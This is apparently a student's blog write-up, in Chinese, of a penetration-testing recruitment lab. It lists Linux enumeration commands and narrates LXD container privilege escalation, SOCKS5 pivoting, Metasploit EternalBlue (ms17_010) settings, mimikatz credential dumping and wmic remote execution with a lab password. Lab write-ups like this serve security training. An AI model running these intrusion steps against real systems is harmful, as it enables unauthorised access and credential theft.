# 内网渗透 guetsec招新靶场

<br>

## 贴个linux信息收集的常用命令

<br>

**1、内核，操作系统和设备信息**

````
uname -a  打印所有可用的系统信息
uname -r  内核版本
uname -n  系统主机名。
uname -m  查看系统内核架构（64位/32位）
hostname  系统主机名
lsb_release -a   发行版信息
cat /proc/version  内核信息
cat /etc/*-release  发行版信息
cat /etc/issue    发行版信息
cat /proc/cpuinfo  CPU信息
````

<br>

**2、用户和群组**

````
cat /etc/passwd     列出系统上的所有用户
cat /etc/group      列出系统上的所有组
groups              当前用户所在的组
groups test         test用户所在的组
getent group xxx      xxx组里的用户
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'      列出所有的超级用户账户
whoami              查看当前用户
w                   谁目前已登录，他们正在做什么
last                最后登录用户的列表
lastlog             所有用户上次登录的信息
lastlog –u %username%  有关指定用户上次登录的信息
````

看到如**sudo:x:27:yokan**可知**yokan用户在sudo组**里。

<br>

**3、用户和权限信息**

````
whoami        当前用户名
id            当前用户信息
cat /etc/sudoers  谁被允许以root身份执行
sudo -l       当前用户可以以root身份执行操作
````

<br>

**4、环境信息**

````
env        显示环境变量
echo %PATH 路径信息
history    显示当前用户的历史命令记录
pwd        输出工作目录
cat /etc/profile   显示默认系统变量
cat /etc/shells    显示可用的shell
````

<br>

## 实战

<br>

这里以咱们的靶场为例


### 1.突破前端

<br>

篇幅有限，先不谈。tomcat弱口令上传哥斯拉木马即可

### 2.linux提权

<br>

<img src="https://54huarui.github.io/blogs/tiquan/1.png" width="880" height="480">

上传fscan后发现权限不足不能运行，没绷住。于是根据经验，我想到另一个办法，用socks5正向代理，再用fscan扫描

兴致勃勃地花了一个小时终于代理进去了，然鹅发现没啥卵用，fscan的sock5功能连不上服务器，于是放弃。不过作为sock5的链接已经搭好了，我决定还是留着，如果发现了啥内网的东西还能有用

<br>

好在天无绝人之路。查看组，发现我们在一个名叫lxd的组

<img src="https://54huarui.github.io/blogs/tiquan/2.png" width="880" height="480">

<br>

#### lxd提权:

**LXD 是基于 LXC 容器的管理程序，当前用户可操作容器。所以用户可创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果。**

按照网上的办法一步步操作

1. **上传alpine-v3.13-x86_64-20210218_0139.tar.gz**
2. **lxc 创建容器并别名为 test**  : lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test
3. **初始化容器 test 并设置选项 security.privileged=true，即允许容器以特权模式运行**  :lxc init test test -c security.privileged=true
4. **将宿主机的根目录 "/" 挂载到容器中的 "/mnt/root" 目录，recursive=true 选项表示在添加设备时递归创建目标路径** :lxc config device add test test disk source=/ path=/mnt/root recursive=true
5. **启动容器 test 并打开一个 shell 会话，可以看到当前权限为容器的 root 权限（注意：不是宿主机的 root 权限）** :lxc start test然后lxc exec test /bin/sh

然鹅，最后一步的获取shell启动失败了，返回null

<img src="https://54huarui.github.io/blogs/tiquan/6.png" width="880" height="480">

<br>

放弃这条路了,为了保持完整的环境，出来先删掉test容器

<br>

### 3.代理

于是我又把目光转向socks5代理

重新开启代理，链接

<img src="https://54huarui.github.io/blogs/tiquan/5.png" width="880" height="480">

<br>

然后在proxifier配置规则

<img src="https://54huarui.github.io/blogs/tiquan/3.png" width="880" height="480">

<br>

尝试链接127.0.0.1:8080端口，正向代理成功

<img src="https://54huarui.github.io/blogs/tiquan/4.png" width="880" height="480">

<br>

思路一下子打开了，既然连接到内网成功了，那岂不是可以直接用物理机上的工具对内网进行扫描和渗透了吗？

<br>

### 验证猜想

首先用proxifier修改一下配置，让proxifier允许我们的代理

<img src="https://54huarui.github.io/blogs/tiquan/7.png" width="880" height="480">

<br>

成功扫描到主机了！

<img src="https://54huarui.github.io/blogs/tiquan/8.png" width="880" height="480">

<br>

接下来就用msf试试

做着做着突然发现对于windows的msf，不知道运行的是哪个exe，根本找不着。所以不懂Proxifier配置规则里的Application应该填什么...

经过长达两个小时的摸索终于找到办法了。。。

<img src="https://54huarui.github.io/blogs/tiquan/9.png" width="880" height="480">

<br>

配置cmd.exe;fscan.exe;OpenConsole.exe;"E:\metasploit-framework\*.exe"即可

<br>

终于扫描到代理来端口的漏洞了(心酸

<img src="https://54huarui.github.io/blogs/tiquan/10.png" width="880" height="480">

不是，这是打算利用radit的漏洞来get shell吗？？怎么兜兜转转又回到刚开始的时候了....

算了不管了，到这一步了不想回头了，万一radit的shell权限更高呢？

md这个msf怎么用哇（哭惹

<br>

----

### 4.攻击

回去睡了一觉，突然就来灵感了

既然我已经代理到第一层内网，我何不扫扫ip看看有什么突破

网卡有个172.172.1.2的ip，用哥斯拉自带的portscan

<img src="https://54huarui.github.io/blogs/tiquan/12.png" width="880" height="480">

<br>

发现这个网段上还有一个叫172.172.1.3的主机，还开放了3389和445端口

<img src="https://54huarui.github.io/blogs/tiquan/13.png" width="880" height="480">

<br>

感觉这工具不行，我换了fscan扫描。一扫，我去，还真有东西，，，这不是永恒之蓝么

<img src="https://54huarui.github.io/blogs/tiquan/11.png" width="880" height="480">

<br>

一下子来了兴致，感觉要有了

<br>

经过一番资料查阅，3389是用来远控的，445这端口挺危险，也是永恒之蓝漏洞利用的途径

<br>

按照网上的办法尝试msf的永恒之蓝

````
search ms17_010 
use 0
set rhosts 172.172.1.3
set rport 445
set lhost 192.168.10.16
````
经过漫长的等待，失败了。。。。。。花了一整晚搞，一直都是fail提示。。

<img src="https://54huarui.github.io/blogs/tiquan/15.png" width="880" height="480">

<br>

就在我万念俱灰，准备砸电脑的时候 突然提示win了 卧槽不是哥们，

要来了要来了，输入shell！！！

。。。。。。又又又报错了。。。。。

<img src="https://54huarui.github.io/blogs/tiquan/14.png" width="880" height="480">

<br>

后来万不得已了，只好厚脸皮求助学长，原来如此，搜嘎，哟西

<img src="https://54huarui.github.io/blogs/tiquan/16.png" width="880" height="480">

<br>

后来切了payload，突然发现题目似了。似得很彻底，第一台靶机都上不去的那种似。反应给学长，学长维护去了，我也安心回去睡觉去了

<br>

-----------

<br>

早早就来社团了，继续搞

终于登上去了，load kiwi 使用猕猴桃，

<img src="https://54huarui.github.io/blogs/tiquan/17.png" width="880" height="480">

<br>

这里得到了俩账户密码，一个是Administrators，一个是admin01。远程控制启动！

不是，怎么Administrators的账号密码不对啊。反而admin01进去了。。。不管了

进去就看到令人忍俊不禁的画面（图是后面截的，所以会有我的文件）

<img src="https://54huarui.github.io/blogs/tiquan/18.png" width="880" height="480">

<br>

看来蛋挞哥捷足先登了，汗流浃背了哥们。。

故技重施，用fscan扫描，又又又发现一个永恒之蓝了。。。

<img src="https://54huarui.github.io/blogs/tiquan/19.jpg" width="880" height="480">

<br>

一开始我就想着在msf上搞个路由，再用sock4代理，让攻击机能直接进入172.172.2的内网。。。后来没成功，会话挂了

<br>

后来又想着传msf木马到windows7，然而阿帕奇服务启动失败。。连不上攻击机。。好吧

<br>

msf的又打不进去了，一直弹fail(环境太卡了

<br>

蛋学长叫我做提权和域内移动，晕乎乎地看了几篇文章，没看明白，做数据结构作业去了

<br>

恍惚间又过了一天

<br>

---------

拔草的时候看到蛋挞哥的文章，顿时思路打开了。原来之前猕猴桃的Administrators账户不是本机的，是域控机的。知道Administrators账户，就可以直接连接域控机子命令执行了

这里用了WMI进行命令执行

<img src="https://54huarui.github.io/blogs/tiquan/20.png" width="880" height="480">

<br>

利用wmic命令执行dir /s /p c:\flag.txt寻找靶机c盘里flag文件，然后将回显输入到/ips.txt

具体命令如下
````
wmic /node:172.172.2.100 /user:Administrator /password:"GUETsec-2024" process call create "cmd.exe /c dir /s /p c:\flag.txt > c:\ip.txt"
````

<br>

然后就是读取回显type \\172.172.2.100\c$\ips.txt

````
C:\Users\admin01>type \\172.172.2.100\c$\ips.txt
 驱动器 C 中的卷没有标签。
 卷的序列号是 38C9-3CF9

 c:\Documents and Settings\Administrator\Desktop 的目录

2024/09/18  09:00                32 flag.txt
               1 个文件             32 字节

````

这里可以找到flag的目录就是c:\Documents and Settings\Administrator\Deskto，我们直接读文件就行

<br>

<img src="https://54huarui.github.io/blogs/tiquan/21.png" width="880" height="480">

<br>

结束，写数据要素论文去了。。。好累